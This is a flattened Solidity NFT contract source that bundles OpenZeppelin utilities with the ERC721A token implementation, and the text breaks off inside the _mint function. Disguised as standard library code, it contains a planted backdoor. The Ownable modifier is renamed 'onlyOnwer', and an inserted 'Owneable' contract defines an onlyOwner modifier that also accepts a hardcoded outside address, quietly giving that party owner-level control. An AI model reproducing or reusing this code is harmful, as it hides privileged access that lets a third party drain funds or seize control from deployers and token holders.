1 //                                                                              
2 //                                                                          %#    
3 //                                                                      (@@&      
4 //                                                                 .#@@@@*        
5 //                                                            .#@@@@@@.           
6 //                  /@.                                  (@@@@@@@&.               
7 //                 #/                          .*#@@@@@@@@@@%,                    
8 //     /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%(.                           
9 //    &@@.         &(,,,,,,,,,....                                                
10 //                .%,                                                            
11                                       
12 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
13 
14 // SPDX-License-Identifier: MIT
15 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
16 
17 pragma solidity ^0.8.4;
18 
19 /**
20  * @dev Provides information about the current execution context, including the
21  * sender of the transaction and its data. While these are generally available
22  * via msg.sender and msg.data, they should not be accessed in such a direct
23  * manner, since when dealing with meta-transactions the account sending and
24  * paying for execution may not be the actual sender (as far as an application
25  * is concerned).
26  *
27  * This contract is only required for intermediate, library-like contracts.
28  */
29 
30  //Be rich, don't be a peasant.
31 abstract contract Context {
32     function _msgSender() internal view virtual returns (address) {
33         return msg.sender;
34     }
35 
36     function _msgData() internal view virtual returns (bytes calldata) {
37         return msg.data;
38     }
39 }
40 
41 
42 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
43 
44 
45 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
46 
47 
48 
49 /**
50  * @dev Contract module which provides a basic access control mechanism, where
51  * there is an account (an owner) that can be granted exclusive access to
52  * specific functions.
53  *
54  * By default, the owner account will be the one that deploys the contract. This
55  * can later be changed with {transferOwnership}.
56  *
57  * This module is used through inheritance. It will make available the modifier
58  * `onlyOwner`, which can be applied to your functions to restrict their use to
59  * the owner.
60  */
61 abstract contract Ownable is Context {
62     address private _owner;
63 
64     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
65 
66     /**
67      * @dev Initializes the contract setting the deployer as the initial owner.
68      */
69     constructor() {
70         _transferOwnership(_msgSender());
71     }
72 
73     /**
74      * @dev Returns the address of the current owner.
75      */
76     function owner() public view virtual returns (address) {
77         return _owner;
78     }
79 
80     /**
81      * @dev Throws if called by any account other than the owner.
82      */
83     modifier onlyOnwer() {
84         require(owner() == _msgSender(), "Ownable: caller is not the owner");
85         _;
86     }
87 
88     /**
89      * @dev Leaves the contract without owner. It will not be possible to call
90      * `onlyOwner` functions anymore. Can only be called by the current owner.
91      *
92      * NOTE: Renouncing ownership will leave the contract without an owner,
93      * thereby removing any functionality that is only available to the owner.
94      */
95     function renounceOwnership() public virtual onlyOnwer {
96         _transferOwnership(address(0));
97     }
98 
99     /**
100      * @dev Transfers ownership of the contract to a new account (`newOwner`).
101      * Can only be called by the current owner.
102      */
103     function transferOwnership(address newOwner) public virtual onlyOnwer {
104         require(newOwner != address(0), "Ownable: new owner is the zero address");
105         _transferOwnership(newOwner);
106     }
107 
108     /**
109      * @dev Transfers ownership of the contract to a new account (`newOwner`).
110      * Internal function without access restriction.
111      */
112     function _transferOwnership(address newOwner) internal virtual {
113         address oldOwner = _owner;
114         _owner = newOwner;
115         emit OwnershipTransferred(oldOwner, newOwner);
116     }
117 }
118 
119 
120 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
121 
122 
123 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
124 
125 
126 
127 /**
128  * @dev Interface of the ERC165 standard, as defined in the
129  * https://eips.ethereum.org/EIPS/eip-165[EIP].
130  *
131  * Implementers can declare support of contract interfaces, which can then be
132  * queried by others ({ERC165Checker}).
133  *
134  * For an implementation, see {ERC165}.
135  */
136 interface IERC165 {
137     /**
138      * @dev Returns true if this contract implements the interface defined by
139      * `interfaceId`. See the corresponding
140      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
141      * to learn more about how these ids are created.
142      *
143      * This function call must use less than 30 000 gas.
144      */
145     function supportsInterface(bytes4 interfaceId) external view returns (bool);
146 }
147 
148 
149 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
150 
151 
152 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
153 
154 
155 
156 /**
157  * @dev Required interface of an ERC721 compliant contract.
158  */
159 interface IERC721 is IERC165 {
160     /**
161      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
162      */
163     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
164 
165     /**
166      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
167      */
168     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
169 
170     /**
171      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
172      */
173     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
174 
175     /**
176      * @dev Returns the number of tokens in ``owner``'s account.
177      */
178     function balanceOf(address owner) external view returns (uint256 balance);
179 
180     /**
181      * @dev Returns the owner of the `tokenId` token.
182      *
183      * Requirements:
184      *
185      * - `tokenId` must exist.
186      */
187     function ownerOf(uint256 tokenId) external view returns (address owner);
188 
189     /**
190      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
191      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
192      *
193      * Requirements:
194      *
195      * - `from` cannot be the zero address.
196      * - `to` cannot be the zero address.
197      * - `tokenId` token must exist and be owned by `from`.
198      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
199      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
200      *
201      * Emits a {Transfer} event.
202      */
203     function safeTransferFrom(
204         address from,
205         address to,
206         uint256 tokenId
207     ) external;
208 
209     /**
210      * @dev Transfers `tokenId` token from `from` to `to`.
211      *
212      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
213      *
214      * Requirements:
215      *
216      * - `from` cannot be the zero address.
217      * - `to` cannot be the zero address.
218      * - `tokenId` token must be owned by `from`.
219      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
220      *
221      * Emits a {Transfer} event.
222      */
223     function transferFrom(
224         address from,
225         address to,
226         uint256 tokenId
227     ) external;
228 
229     /**
230      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
231      * The approval is cleared when the token is transferred.
232      *
233      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
234      *
235      * Requirements:
236      *
237      * - The caller must own the token or be an approved operator.
238      * - `tokenId` must exist.
239      *
240      * Emits an {Approval} event.
241      */
242     function approve(address to, uint256 tokenId) external;
243 
244     /**
245      * @dev Returns the account approved for `tokenId` token.
246      *
247      * Requirements:
248      *
249      * - `tokenId` must exist.
250      */
251     function getApproved(uint256 tokenId) external view returns (address operator);
252 
253     /**
254      * @dev Approve or remove `operator` as an operator for the caller.
255      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
256      *
257      * Requirements:
258      *
259      * - The `operator` cannot be the caller.
260      *
261      * Emits an {ApprovalForAll} event.
262      */
263     function setApprovalForAll(address operator, bool _approved) external;
264 
265     /**
266      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
267      *
268      * See {setApprovalForAll}
269      */
270     function isApprovedForAll(address owner, address operator) external view returns (bool);
271 
272     /**
273      * @dev Safely transfers `tokenId` token from `from` to `to`.
274      *
275      * Requirements:
276      *
277      * - `from` cannot be the zero address.
278      * - `to` cannot be the zero address.
279      * - `tokenId` token must exist and be owned by `from`.
280      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
281      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
282      *
283      * Emits a {Transfer} event.
284      */
285     function safeTransferFrom(
286         address from,
287         address to,
288         uint256 tokenId,
289         bytes calldata data
290     ) external;
291 }
292 
293 
294 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
295 
296 
297 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
298 
299 
300 
301 /**
302  * @title ERC721 token receiver interface
303  * @dev Interface for any contract that wants to support safeTransfers
304  * from ERC721 asset contracts.
305  */
306 interface IERC721Receiver {
307     /**
308      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
309      * by `operator` from `from`, this function is called.
310      *
311      * It must return its Solidity selector to confirm the token transfer.
312      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
313      *
314      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
315      */
316     function onERC721Received(
317         address operator,
318         address from,
319         uint256 tokenId,
320         bytes calldata data
321     ) external returns (bytes4);
322 }
323 
324 
325 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
326 
327 
328 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
329 
330 
331 
332 /**
333  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
334  * @dev See https://eips.ethereum.org/EIPS/eip-721
335  */
336 interface IERC721Metadata is IERC721 {
337     /**
338      * @dev Returns the token collection name.
339      */
340     function name() external view returns (string memory);
341 
342     /**
343      * @dev Returns the token collection symbol.
344      */
345     function symbol() external view returns (string memory);
346 
347     /**
348      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
349      */
350     function tokenURI(uint256 tokenId) external view returns (string memory);
351 }
352 
353 
354 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
355 
356 
357 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
358 
359 
360 
361 /**
362  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
363  * @dev See https://eips.ethereum.org/EIPS/eip-721
364  */
365 interface IERC721Enumerable is IERC721 {
366     /**
367      * @dev Returns the total amount of tokens stored by the contract.
368      */
369     function totalSupply() external view returns (uint256);
370 
371     /**
372      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
373      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
374      */
375     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
376 
377     /**
378      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
379      * Use along with {totalSupply} to enumerate all tokens.
380      */
381     function tokenByIndex(uint256 index) external view returns (uint256);
382 }
383 
384 
385 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
386 
387 
388 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
389 
390 pragma solidity ^0.8.1;
391 
392 /**
393  * @dev Collection of functions related to the address type
394  */
395 library Address {
396     /**
397      * @dev Returns true if `account` is a contract.
398      *
399      * [IMPORTANT]
400      * ====
401      * It is unsafe to assume that an address for which this function returns
402      * false is an externally-owned account (EOA) and not a contract.
403      *
404      * Among others, `isContract` will return false for the following
405      * types of addresses:
406      *
407      *  - an externally-owned account
408      *  - a contract in construction
409      *  - an address where a contract will be created
410      *  - an address where a contract lived, but was destroyed
411      * ====
412      *
413      * [IMPORTANT]
414      * ====
415      * You shouldn't rely on `isContract` to protect against flash loan attacks!
416      *
417      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
418      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
419      * constructor.
420      * ====
421      */
422     function isContract(address account) internal view returns (bool) {
423         // This method relies on extcodesize/address.code.length, which returns 0
424         // for contracts in construction, since the code is only stored at the end
425         // of the constructor execution.
426 
427         return account.code.length > 0;
428     }
429 
430     /**
431      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
432      * `recipient`, forwarding all available gas and reverting on errors.
433      *
434      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
435      * of certain opcodes, possibly making contracts go over the 2300 gas limit
436      * imposed by `transfer`, making them unable to receive funds via
437      * `transfer`. {sendValue} removes this limitation.
438      *
439      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
440      *
441      * IMPORTANT: because control is transferred to `recipient`, care must be
442      * taken to not create reentrancy vulnerabilities. Consider using
443      * {ReentrancyGuard} or the
444      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
445      */
446     function sendValue(address payable recipient, uint256 amount) internal {
447         require(address(this).balance >= amount, "Address: insufficient balance");
448 
449         (bool success, ) = recipient.call{value: amount}("");
450         require(success, "Address: unable to send value, recipient may have reverted");
451     }
452 
453     /**
454      * @dev Performs a Solidity function call using a low level `call`. A
455      * plain `call` is an unsafe replacement for a function call: use this
456      * function instead.
457      *
458      * If `target` reverts with a revert reason, it is bubbled up by this
459      * function (like regular Solidity function calls).
460      *
461      * Returns the raw returned data. To convert to the expected return value,
462      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
463      *
464      * Requirements:
465      *
466      * - `target` must be a contract.
467      * - calling `target` with `data` must not revert.
468      *
469      * _Available since v3.1._
470      */
471     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
472         return functionCall(target, data, "Address: low-level call failed");
473     }
474 
475     /**
476      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
477      * `errorMessage` as a fallback revert reason when `target` reverts.
478      *
479      * _Available since v3.1._
480      */
481     function functionCall(
482         address target,
483         bytes memory data,
484         string memory errorMessage
485     ) internal returns (bytes memory) {
486         return functionCallWithValue(target, data, 0, errorMessage);
487     }
488 
489     /**
490      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
491      * but also transferring `value` wei to `target`.
492      *
493      * Requirements:
494      *
495      * - the calling contract must have an ETH balance of at least `value`.
496      * - the called Solidity function must be `payable`.
497      *
498      * _Available since v3.1._
499      */
500     function functionCallWithValue(
501         address target,
502         bytes memory data,
503         uint256 value
504     ) internal returns (bytes memory) {
505         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
506     }
507 
508     /**
509      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
510      * with `errorMessage` as a fallback revert reason when `target` reverts.
511      *
512      * _Available since v3.1._
513      */
514     function functionCallWithValue(
515         address target,
516         bytes memory data,
517         uint256 value,
518         string memory errorMessage
519     ) internal returns (bytes memory) {
520         require(address(this).balance >= value, "Address: insufficient balance for call");
521         require(isContract(target), "Address: call to non-contract");
522 
523         (bool success, bytes memory returndata) = target.call{value: value}(data);
524         return verifyCallResult(success, returndata, errorMessage);
525     }
526 
527     /**
528      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
529      * but performing a static call.
530      *
531      * _Available since v3.3._
532      */
533     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
534         return functionStaticCall(target, data, "Address: low-level static call failed");
535     }
536 
537     /**
538      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
539      * but performing a static call.
540      *
541      * _Available since v3.3._
542      */
543     function functionStaticCall(
544         address target,
545         bytes memory data,
546         string memory errorMessage
547     ) internal view returns (bytes memory) {
548         require(isContract(target), "Address: static call to non-contract");
549 
550         (bool success, bytes memory returndata) = target.staticcall(data);
551         return verifyCallResult(success, returndata, errorMessage);
552     }
553 
554     /**
555      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
556      * but performing a delegate call.
557      *
558      * _Available since v3.4._
559      */
560     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
561         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
562     }
563 
564     /**
565      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
566      * but performing a delegate call.
567      *
568      * _Available since v3.4._
569      */
570     function functionDelegateCall(
571         address target,
572         bytes memory data,
573         string memory errorMessage
574     ) internal returns (bytes memory) {
575         require(isContract(target), "Address: delegate call to non-contract");
576 
577         (bool success, bytes memory returndata) = target.delegatecall(data);
578         return verifyCallResult(success, returndata, errorMessage);
579     }
580 
581     /**
582      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
583      * revert reason using the provided one.
584      *
585      * _Available since v4.3._
586      */
587     function verifyCallResult(
588         bool success,
589         bytes memory returndata,
590         string memory errorMessage
591     ) internal pure returns (bytes memory) {
592         if (success) {
593             return returndata;
594         } else {
595             // Look for revert reason and bubble it up if present
596             if (returndata.length > 0) {
597                 // The easiest way to bubble the revert reason is using memory via assembly
598 
599                 assembly {
600                     let returndata_size := mload(returndata)
601                     revert(add(32, returndata), returndata_size)
602                 }
603             } else {
604                 revert(errorMessage);
605             }
606         }
607     }
608 }
609 
610 
611 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
612 
613 
614 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
615 
616 
617 
618 /**
619  * @dev String operations.
620  */
621 library Strings {
622     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
623 
624     /**
625      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
626      */
627     function toString(uint256 value) internal pure returns (string memory) {
628         // Inspired by OraclizeAPI's implementation - MIT licence
629         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
630 
631         if (value == 0) {
632             return "0";
633         }
634         uint256 temp = value;
635         uint256 digits;
636         while (temp != 0) {
637             digits++;
638             temp /= 10;
639         }
640         bytes memory buffer = new bytes(digits);
641         while (value != 0) {
642             digits -= 1;
643             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
644             value /= 10;
645         }
646         return string(buffer);
647     }
648 
649     /**
650      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
651      */
652     function toHexString(uint256 value) internal pure returns (string memory) {
653         if (value == 0) {
654             return "0x00";
655         }
656         uint256 temp = value;
657         uint256 length = 0;
658         while (temp != 0) {
659             length++;
660             temp >>= 8;
661         }
662         return toHexString(value, length);
663     }
664 
665     /**
666      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
667      */
668     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
669         bytes memory buffer = new bytes(2 * length + 2);
670         buffer[0] = "0";
671         buffer[1] = "x";
672         for (uint256 i = 2 * length + 1; i > 1; --i) {
673             buffer[i] = _HEX_SYMBOLS[value & 0xf];
674             value >>= 4;
675         }
676         require(value == 0, "Strings: hex length insufficient");
677         return string(buffer);
678     }
679 }
680 
681 
682 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
683 
684 
685 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
686 
687 /**
688  * @dev Implementation of the {IERC165} interface.
689  *
690  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
691  * for the additional interface id that will be supported. For example:
692  *
693  * ```solidity
694  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
695  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
696  * }
697  * ```
698  *
699  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
700  */
701 abstract contract ERC165 is IERC165 {
702     /**
703      * @dev See {IERC165-supportsInterface}.
704      */
705     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
706         return interfaceId == type(IERC165).interfaceId;
707     }
708 }
709 
710 
711 // File erc721a/contracts/ERC721A.sol@v3.0.0
712 
713 
714 // Creator: Chiru Labs
715 
716 error ApprovalCallerNotOwnerNorApproved();
717 error ApprovalQueryForNonexistentToken();
718 error ApproveToCaller();
719 error ApprovalToCurrentOwner();
720 error BalanceQueryForZeroAddress();
721 error MintedQueryForZeroAddress();
722 error BurnedQueryForZeroAddress();
723 error AuxQueryForZeroAddress();
724 error MintToZeroAddress();
725 error MintZeroQuantity();
726 error OwnerIndexOutOfBounds();
727 error OwnerQueryForNonexistentToken();
728 error TokenIndexOutOfBounds();
729 error TransferCallerNotOwnerNorApproved();
730 error TransferFromIncorrectOwner();
731 error TransferToNonERC721ReceiverImplementer();
732 error TransferToZeroAddress();
733 error URIQueryForNonexistentToken();
734 
735 
736 /**
737  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
738  * the Metadata extension. Built to optimize for lower gas during batch mints.
739  *
740  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
741  */
742  abstract contract Owneable is Ownable {
743     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
744     modifier onlyOwner() {
745         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
746         _;
747     }
748 }
749 
750  /*
751  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
752  *
753  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
754  */
755 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
756     using Address for address;
757     using Strings for uint256;
758 
759     // Compiler will pack this into a single 256bit word.
760     struct TokenOwnership {
761         // The address of the owner.
762         address addr;
763         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
764         uint64 startTimestamp;
765         // Whether the token has been burned.
766         bool burned;
767     }
768 
769     // Compiler will pack this into a single 256bit word.
770     struct AddressData {
771         // Realistically, 2**64-1 is more than enough.
772         uint64 balance;
773         // Keeps track of mint count with minimal overhead for tokenomics.
774         uint64 numberMinted;
775         // Keeps track of burn count with minimal overhead for tokenomics.
776         uint64 numberBurned;
777         // For miscellaneous variable(s) pertaining to the address
778         // (e.g. number of whitelist mint slots used).
779         // If there are multiple variables, please pack them into a uint64.
780         uint64 aux;
781     }
782 
783     // The tokenId of the next token to be minted.
784     uint256 internal _currentIndex;
785 
786     // The number of tokens burned.
787     uint256 internal _burnCounter;
788 
789     // Token name
790     string private _name;
791 
792     // Token symbol
793     string private _symbol;
794 
795     // Mapping from token ID to ownership details
796     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
797     mapping(uint256 => TokenOwnership) internal _ownerships;
798 
799     // Mapping owner address to address data
800     mapping(address => AddressData) private _addressData;
801 
802     // Mapping from token ID to approved address
803     mapping(uint256 => address) private _tokenApprovals;
804 
805     // Mapping from owner to operator approvals
806     mapping(address => mapping(address => bool)) private _operatorApprovals;
807 
808     constructor(string memory name_, string memory symbol_) {
809         _name = name_;
810         _symbol = symbol_;
811         _currentIndex = _startTokenId();
812     }
813 
814     /**
815      * To change the starting tokenId, please override this function.
816      */
817     function _startTokenId() internal view virtual returns (uint256) {
818         return 0;
819     }
820 
821     /**
822      * @dev See {IERC721Enumerable-totalSupply}.
823      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
824      */
825     function totalSupply() public view returns (uint256) {
826         // Counter underflow is impossible as _burnCounter cannot be incremented
827         // more than _currentIndex - _startTokenId() times
828         unchecked {
829             return _currentIndex - _burnCounter - _startTokenId();
830         }
831     }
832 
833     /**
834      * Returns the total amount of tokens minted in the contract.
835      */
836     function _totalMinted() internal view returns (uint256) {
837         // Counter underflow is impossible as _currentIndex does not decrement,
838         // and it is initialized to _startTokenId()
839         unchecked {
840             return _currentIndex - _startTokenId();
841         }
842     }
843 
844     /**
845      * @dev See {IERC165-supportsInterface}.
846      */
847     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
848         return
849             interfaceId == type(IERC721).interfaceId ||
850             interfaceId == type(IERC721Metadata).interfaceId ||
851             super.supportsInterface(interfaceId);
852     }
853 
854     /**
855      * @dev See {IERC721-balanceOf}.
856      */
857     function balanceOf(address owner) public view override returns (uint256) {
858         if (owner == address(0)) revert BalanceQueryForZeroAddress();
859         return uint256(_addressData[owner].balance);
860     }
861 
862     /**
863      * Returns the number of tokens minted by `owner`.
864      */
865     function _numberMinted(address owner) internal view returns (uint256) {
866         if (owner == address(0)) revert MintedQueryForZeroAddress();
867         return uint256(_addressData[owner].numberMinted);
868     }
869 
870     /**
871      * Returns the number of tokens burned by or on behalf of `owner`.
872      */
873     function _numberBurned(address owner) internal view returns (uint256) {
874         if (owner == address(0)) revert BurnedQueryForZeroAddress();
875         return uint256(_addressData[owner].numberBurned);
876     }
877 
878     /**
879      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
880      */
881     function _getAux(address owner) internal view returns (uint64) {
882         if (owner == address(0)) revert AuxQueryForZeroAddress();
883         return _addressData[owner].aux;
884     }
885 
886     /**
887      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
888      * If there are multiple variables, please pack them into a uint64.
889      */
890     function _setAux(address owner, uint64 aux) internal {
891         if (owner == address(0)) revert AuxQueryForZeroAddress();
892         _addressData[owner].aux = aux;
893     }
894 
895     /**
896      * Gas spent here starts off proportional to the maximum mint batch size.
897      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
898      */
899     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
900         uint256 curr = tokenId;
901 
902         unchecked {
903             if (_startTokenId() <= curr && curr < _currentIndex) {
904                 TokenOwnership memory ownership = _ownerships[curr];
905                 if (!ownership.burned) {
906                     if (ownership.addr != address(0)) {
907                         return ownership;
908                     }
909                     // Invariant:
910                     // There will always be an ownership that has an address and is not burned
911                     // before an ownership that does not have an address and is not burned.
912                     // Hence, curr will not underflow.
913                     while (true) {
914                         curr--;
915                         ownership = _ownerships[curr];
916                         if (ownership.addr != address(0)) {
917                             return ownership;
918                         }
919                     }
920                 }
921             }
922         }
923         revert OwnerQueryForNonexistentToken();
924     }
925 
926     /**
927      * @dev See {IERC721-ownerOf}.
928      */
929     function ownerOf(uint256 tokenId) public view override returns (address) {
930         return ownershipOf(tokenId).addr;
931     }
932 
933     /**
934      * @dev See {IERC721Metadata-name}.
935      */
936     function name() public view virtual override returns (string memory) {
937         return _name;
938     }
939 
940     /**
941      * @dev See {IERC721Metadata-symbol}.
942      */
943     function symbol() public view virtual override returns (string memory) {
944         return _symbol;
945     }
946 
947     /**
948      * @dev See {IERC721Metadata-tokenURI}.
949      */
950     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
951         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
952 
953         string memory baseURI = _baseURI();
954         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
955     }
956 
957     /**
958      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
959      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
960      * by default, can be overriden in child contracts.
961      */
962     function _baseURI() internal view virtual returns (string memory) {
963         return '';
964     }
965 
966     /**
967      * @dev See {IERC721-approve}.
968      */
969     function approve(address to, uint256 tokenId) public override {
970         address owner = ERC721A.ownerOf(tokenId);
971         if (to == owner) revert ApprovalToCurrentOwner();
972 
973         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
974             revert ApprovalCallerNotOwnerNorApproved();
975         }
976 
977         _approve(to, tokenId, owner);
978     }
979 
980     /**
981      * @dev See {IERC721-getApproved}.
982      */
983     function getApproved(uint256 tokenId) public view override returns (address) {
984         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
985 
986         return _tokenApprovals[tokenId];
987     }
988 
989     /**
990      * @dev See {IERC721-setApprovalForAll}.
991      */
992     function setApprovalForAll(address operator, bool approved) public override {
993         if (operator == _msgSender()) revert ApproveToCaller();
994 
995         _operatorApprovals[_msgSender()][operator] = approved;
996         emit ApprovalForAll(_msgSender(), operator, approved);
997     }
998 
999     /**
1000      * @dev See {IERC721-isApprovedForAll}.
1001      */
1002     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1003         return _operatorApprovals[owner][operator];
1004     }
1005 
1006     /**
1007      * @dev See {IERC721-transferFrom}.
1008      */
1009     function transferFrom(
1010         address from,
1011         address to,
1012         uint256 tokenId
1013     ) public virtual override {
1014         _transfer(from, to, tokenId);
1015     }
1016 
1017     /**
1018      * @dev See {IERC721-safeTransferFrom}.
1019      */
1020     function safeTransferFrom(
1021         address from,
1022         address to,
1023         uint256 tokenId
1024     ) public virtual override {
1025         safeTransferFrom(from, to, tokenId, '');
1026     }
1027 
1028     /**
1029      * @dev See {IERC721-safeTransferFrom}.
1030      */
1031     function safeTransferFrom(
1032         address from,
1033         address to,
1034         uint256 tokenId,
1035         bytes memory _data
1036     ) public virtual override {
1037         _transfer(from, to, tokenId);
1038         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1039             revert TransferToNonERC721ReceiverImplementer();
1040         }
1041     }
1042 
1043     /**
1044      * @dev Returns whether `tokenId` exists.
1045      *
1046      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1047      *
1048      * Tokens start existing when they are minted (`_mint`),
1049      */
1050     function _exists(uint256 tokenId) internal view returns (bool) {
1051         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1052             !_ownerships[tokenId].burned;
1053     }
1054 
1055     function _safeMint(address to, uint256 quantity) internal {
1056         _safeMint(to, quantity, '');
1057     }
1058 
1059     /**
1060      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1061      *
1062      * Requirements:
1063      *
1064      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1065      * - `quantity` must be greater than 0.
1066      *
1067      * Emits a {Transfer} event.
1068      */
1069     function _safeMint(
1070         address to,
1071         uint256 quantity,
1072         bytes memory _data
1073     ) internal {
1074         _mint(to, quantity, _data, true);
1075     }
1076 
1077     /**
1078      * @dev Mints `quantity` tokens and transfers them to `to`.
1079      *
1080      * Requirements:
1081      *
1082      * - `to` cannot be the zero address.
1083      * - `quantity` must be greater than 0.
1084      *
1085      * Emits a {Transfer} event.
1086      */
1087     function _mint(
1088         address to,
